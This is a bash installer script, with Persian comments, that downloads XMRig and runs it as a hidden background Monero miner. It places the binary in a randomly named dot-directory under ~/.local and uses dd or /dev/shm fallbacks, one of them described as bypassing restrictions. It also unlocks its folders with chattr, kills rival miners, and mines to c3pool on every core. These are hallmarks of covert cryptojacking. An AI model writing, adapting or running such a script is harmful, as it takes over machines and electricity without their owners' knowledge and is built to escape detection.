#!/bin/bash
VERSION=2.29
echo "XMRig Miner v$VERSION - FORCED IN /home/user/.local/ - ALL USERS"
echo
export LC_ALL=C
export LANG=C

# --- یوزر و مسیر ---
REAL_USER="$(whoami)"
REAL_HOME="/home/$REAL_USER"
LOCAL_DIR="$REAL_HOME/.local"
WALLET="$1"

if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    exit 1
fi

# --- پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "ERROR: Install curl & tar"
    exit 1
fi

# --- هسته‌ها ---
CPU_TOTAL=$(nproc 2>/dev/null || echo 1)
USABLE_THREADS=$CPU_TOTAL
CPU_HINT=85
echo "[*] Using $USABLE_THREADS threads @ $CPU_HINT%"

# --- ساخت .local اگر نبود ---
if [ ! -d "$LOCAL_DIR" ]; then
    mkdir -p "$LOCAL_DIR" || { echo "ERROR: Cannot create $LOCAL_DIR"; exit 1; }
fi
chmod 700 "$LOCAL_DIR" 2>/dev/null

# --- مسیر مخفی ---
RAND_HEX=$(openssl rand -hex 16 2>/dev/null || date +%s%N | sha256sum | head -c 32)
BASE_DIR="$LOCAL_DIR/.miner_$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

# --- ساخت پوشه با چک کامل ---
if ! mkdir -p "$BASE_DIR" "$LOG_DIR" 2>/dev/null; then
    echo "ERROR: Cannot create $BASE_DIR"
    exit 1
fi

# --- رفع قفل‌های احتمالی ---
chmod 700 "$BASE_DIR" "$LOG_DIR" 2>/dev/null
chattr -i "$BASE_DIR" "$LOG_DIR" 2>/dev/null || true

# --- تست نوشتن فایل ---
if ! echo "test" > "$BASE_DIR/.test_write" 2>/dev/null || ! rm "$BASE_DIR/.test_write" 2>/dev/null; then
    echo "ERROR: $BASE_DIR not writable for files"
    exit 1
fi

echo "[*] Installing in: $BASE_DIR"

# --- پاک‌سازی ---
pkill -f xmrig 2>/dev/null
find "$LOCAL_DIR" -name ".miner_*" -type d -exec rm -rf {} + 2>/dev/null

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_TAR="/tmp/xmrig_$(date +%s).tgz"

curl -fsSL "$URL" -o "$TMP_TAR" || { echo "ERROR: Download failed"; exit 1; }
tar xzf "$TMP_TAR" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP_TAR"; exit 1; }

XMRIG_BIN=$(find /tmp -name xmrig -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && { echo "ERROR: xmrig not found"; rm -f "$TMP_TAR"; exit 1; }

# --- کپی با روش‌های مختلف ---
install_binary() {
    # روش 1: cp
    if cp "$XMRIG_BIN" "$BASE_DIR/main" 2>/dev/null; then return 0; fi
    
    # روش 2: dd (بای‌پس محدودیت)
    if dd if="$XMRIG_BIN" of="$BASE_DIR/main" bs=1M 2>/dev/null; then return 0; fi
    
    # روش 3: cat
    if cat "$XMRIG_BIN" > "$BASE_DIR/main" 2>/dev/null; then return 0; fi
    
    return 1
}

if ! install_binary; then
    # روش 4: symlink به /dev/shm
    SHM_DIR="/dev/shm/.miner_$(date +%s)"
    mkdir -p "$SHM_DIR" 2>/dev/null
    cp "$XMRIG_BIN" "$SHM_DIR/main" || { echo "ERROR: Even /dev/shm failed"; exit 1; }
    chmod +x "$SHM_DIR/main"
    ln -sf "$SHM_DIR/main" "$BASE_DIR/main"
    echo "[*] Binary in RAM: $SHM_DIR/main → $BASE_DIR/main"
else
    chmod +x "$BASE_DIR/main"
fi

rm -f "$TMP_TAR" /tmp/xmrig* 2>/dev/null

# --- config.json ---
cat > "$BASE_DIR/config.json" << EOF
{
    "api": {"id": null, "worker-id": "$REAL_USER"},
    "http": {"enabled": false},
    "autosave": true,
    "background": true,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": false,
        "wrmsr": false,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "hw-aes": true,
        "rx/0": [true],
        "threads": $USABLE_THREADS
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$REAL_USER",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }]
}
EOF

# --- control ---
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
cd "$(dirname "$0")" || exit 1
MAIN="./main"
[ ! -x "$MAIN" ] && MAIN="$(readlink -f "$MAIN")"
case "$1" in
    start)
        pgrep -f "$MAIN" >/dev/null && { echo "Running"; exit 0; }
        nohup "$MAIN" --config=config.json --cpu-max-threads-hint=85 > .log/output.log 2>&1 &
        echo $! > .pid
        sleep 5
        echo "Started"
        ;;
    stop)
        pkill -f "$MAIN" 2>/dev/null
        rm -f .pid
        echo "Stopped"
        ;;
    status)
        pgrep -f "$MAIN" >/dev/null && echo "Running" || echo "Stopped"
        ;;
    logs) tail -20 .log/output.log 2>/dev/null || echo "No logs" ;;
    *) echo "Usage: $0 {start|stop|status|logs}" ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# --- استارت ---
"$BASE_DIR/control" start

sleep 15
echo
echo "=== SUCCESS ==="
echo "Miner running in: $BASE_DIR"
echo "Control: $BASE_DIR/control status"
echo "All $USABLE_THREADS cores @ 85%"

exit 0
